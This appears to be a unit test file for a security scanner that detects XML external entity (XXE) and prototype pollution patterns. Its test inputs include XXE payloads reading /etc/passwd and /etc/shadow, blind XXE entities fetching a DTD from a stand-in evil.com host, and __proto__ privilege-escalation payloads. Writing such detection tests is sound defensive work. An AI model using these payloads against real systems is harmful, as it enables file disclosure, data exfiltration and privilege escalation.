/**
 * Unit Tests for S17: XXE and Prototype Pollution Detector
 */

import { describe, it, expect } from 'vitest';
import type { Finding } from '../types.js';
import { scannerRegistry } from './registry.js';
import {
  xxeProtoPollutionModule,
  detectXxeInContext,
  XXE_PATTERNS,
  PROTOTYPE_POLLUTION_PATTERNS,
} from './xxe-protopollution.js';

function scanText(text: string): Finding[] {
  return xxeProtoPollutionModule.scan(text, text.toLowerCase());
}

function hasPattern(findings: Finding[], name: string): boolean {
  return findings.some(f => f.pattern_name === name);
}

function hasSeverity(findings: Finding[], severity: string): boolean {
  return findings.some(f => f.severity === severity);
}

describe('S17: XXE and Prototype Pollution Detector', () => {
  // ========================================================================
  // Module Metadata
  // ========================================================================

  describe('Module metadata', () => {
    it('should be registered in scannerRegistry', () => {
      expect(scannerRegistry.hasModule('xxe-protopollution')).toBe(true);
    });

    it('should have correct name and version', () => {
      expect(xxeProtoPollutionModule.name).toBe('xxe-protopollution');
      expect(xxeProtoPollutionModule.version).toBe('1.0.0');
    });

    it('should have positive pattern count including custom detectors', () => {
      const count = xxeProtoPollutionModule.getPatternCount();
      expect(count).toBeGreaterThan(0);
      expect(count).toBe(XXE_PATTERNS.length + PROTOTYPE_POLLUTION_PATTERNS.length + 1);
    });

    it('should return pattern groups with correct structure', () => {
      const groups = xxeProtoPollutionModule.getPatternGroups();
      expect(groups.length).toBe(3);
      expect(groups.map(g => g.name)).toContain('XXE_PATTERNS');
      expect(groups.map(g => g.name)).toContain('PROTOTYPE_POLLUTION_PATTERNS');
      expect(groups.map(g => g.name)).toContain('xxe-pp-custom-detectors');
      for (const g of groups) {
        expect(g.source).toBe('S17');
        expect(g.count).toBeGreaterThan(0);
      }
    });
  });

  // ========================================================================
  // XXE Pattern Tests
  // ========================================================================

  describe('XXE Patterns', () => {
    it('should detect DOCTYPE declarations with internal subset', () => {
      const text = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_doctype_declaration')).toBe(true);
    });

    it('should detect ENTITY with SYSTEM identifier', () => {
      const text = '<!ENTITY xxe SYSTEM "file:///etc/passwd">';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_entity_system')).toBe(true);
    });

    it('should detect ENTITY with PUBLIC identifier', () => {
      const text = '<!ENTITY xxe PUBLIC "-//W3C//DTD XHTML" "http://evil.com/payload.dtd">';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_entity_public')).toBe(true);
    });

    it('should detect external entity references (&xxe;)', () => {
      const text = '<root>&xxe;</root>';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_external_entity_ref')).toBe(true);
    });

    it('should not flag standard XML entities (&amp; &lt; etc.)', () => {
      const text = '<root>&amp; &lt; &gt; &quot; &apos; &#65; &#x41;</root>';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_external_entity_ref')).toBe(false);
    });

    it('should detect parameter entity declarations', () => {
      const text = '<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_parameter_entity')).toBe(true);
    });

    it('should detect parameter entity references (%ent;)', () => {
      const text = '<!DOCTYPE foo [ <!ENTITY % payload SYSTEM "evil.dtd"> %payload; %exfil; ]>';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_parameter_entity_ref')).toBe(true);
    });

    it('should detect xml-stylesheet processing instruction', () => {
      const text = '<?xml-stylesheet type="text/xsl" href="http://evil.com/steal.xsl"?>';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_xml_stylesheet_pi')).toBe(true);
    });

    it('should detect CDATA with XXE payload inside', () => {
      const text = '<![CDATA[ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]]>';
      const findings = scanText(text);
      expect(hasPattern(findings, 'xxe_cdata_injection')).toBe(true);
    });
  });

  // ========================================================================
  // Prototype Pollution Pattern Tests
  // ========================================================================

  describe('Prototype Pollution Patterns', () => {
    it('should detect __proto__ access', () => {
      const text = '{"__proto__": {"isAdmin": true}}';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_dunder_access')).toBe(true);
    });

    it('should detect constructor.prototype manipulation', () => {
      const text = 'obj.constructor.prototype.isAdmin = true;';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_constructor_prototype')).toBe(true);
    });

    it('should detect constructor["prototype"] bracket notation', () => {
      const text = 'obj.constructor["prototype"].polluted = true;';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_constructor_prototype')).toBe(true);
    });

    it('should detect Object.assign with tainted source', () => {
      const text = 'Object.assign(target, JSON.parse(body));';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_object_assign_tainted')).toBe(true);
    });

    it('should detect JSON.parse with __proto__', () => {
      const text = 'const obj = JSON.parse(\'{"__proto__": {"admin": true}}\');';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_json_parse_proto')).toBe(true);
    });

    it('should detect prototype chain modification via Object API', () => {
      const text = 'Object.setPrototypeOf(target, malicious);';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_chain_modification')).toBe(true);
    });

    it('should detect bracket notation ["__proto__"] assignment', () => {
      const text = 'obj["__proto__"].polluted = true;';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_bracket_proto_assign')).toBe(true);
    });

    it('should detect direct prototype property assignment', () => {
      const text = 'Array.prototype.flat = function() { /* malicious */ };';
      const findings = scanText(text);
      expect(hasPattern(findings, 'proto_prototype_assign')).toBe(true);
    });
  });

  // ========================================================================
  // detectXxeInContext Custom Detector
  // ========================================================================

  describe('detectXxeInContext()', () => {
    it('should flag XML document with DOCTYPE + ENTITY as high-confidence XXE', () => {
      const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`;
      const findings = detectXxeInContext(xml);
      expect(findings.some(f => f.pattern_name === 'xxe_context_xml_with_entity')).toBe(true);
      expect(findings.some(f => f.severity === 'CRITICAL')).toBe(true);
    });

    it('should elevate severity for SYSTEM protocol URI in XML context', () => {
      const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>`;
      const findings = detectXxeInContext(xml);
      expect(findings.some(f => f.pattern_name === 'xxe_context_protocol_uri')).toBe(true);
      const protocolFinding = findings.find(f => f.pattern_name === 'xxe_context_protocol_uri');
      expect(protocolFinding?.severity).toBe('CRITICAL');
    });

    it('should report WARNING for SYSTEM protocol URI without XML header', () => {
      const text = '<!ENTITY xxe SYSTEM "http://evil.com/steal">';
      const findings = detectXxeInContext(text);
      const protocolFinding = findings.find(f => f.pattern_name === 'xxe_context_protocol_uri');
      expect(protocolFinding?.severity).toBe('WARNING');
    });

    it('should detect blind XXE via parameter entity chaining', () => {
      const xml = `<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
  %exfil;
]>`;
      const findings = detectXxeInContext(xml);
      expect(findings.some(f => f.pattern_name === 'xxe_context_blind_param_chain')).toBe(true);
    });

    it('should return empty for clean text without XML', () => {
      expect(detectXxeInContext('This is a normal document about XML security.')).toHaveLength(0);
    });

    it('should return empty for plain XML without entities', () => {
      const xml = '<?xml version="1.0"?>\n<root><child>data</child></root>';
      expect(detectXxeInContext(xml)).toHaveLength(0);
    });
  });

  // ========================================================================
  // Full scan integration tests
  // ========================================================================

  describe('Full scan integration', () => {
    it('should detect combined XXE + prototype pollution in single input', () => {
      const text = `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
<script>obj.__proto__.isAdmin = true;</script>`;
      const findings = scanText(text);
      expect(findings.some(f => f.category === 'XXE')).toBe(true);
      expect(findings.some(f => f.category === 'PROTOTYPE_POLLUTION')).toBe(true);
    });

    it('should set correct engine and source on all findings', () => {
      const text = '<!ENTITY xxe SYSTEM "file:///etc/shadow"> obj.__proto__.x = 1';
      const findings = scanText(text);
      expect(findings.length).toBeGreaterThan(0);
      for (const f of findings) {
        expect(f.engine).toBe('xxe-protopollution');
        expect(f.source).toBe('S17');
      }
    });

    it('should truncate match field to 100 characters', () => {
      const longEntity = '<!ENTITY xxe SYSTEM "' + 'A'.repeat(200) + '">';
      const findings = scanText(longEntity);
      for (const f of findings) {
        expect(f.match.length).toBeLessThanOrEqual(100);
      }
    });
  });

  // ========================================================================
  // False positives
  // ========================================================================

  describe('False positives', () => {
    it('should not flag clean HTML document', () => {
      const html = '<html><head><title>My Page</title></head><body><p>Hello &amp; welcome</p></body></html>';
      const findings = scanText(html);
      expect(findings).toHaveLength(0);
    });

    it('should not flag discussion about prototype pattern', () => {
      const text = 'The prototype design pattern is useful for cloning objects efficiently.';
      const findings = scanText(text);
      expect(findings).toHaveLength(0);
    });

    it('should not flag standard XML without entities', () => {
      const xml = '<config><setting name="theme">dark</setting></config>';
      const findings = scanText(xml);
      expect(findings).toHaveLength(0);
    });
  });
});
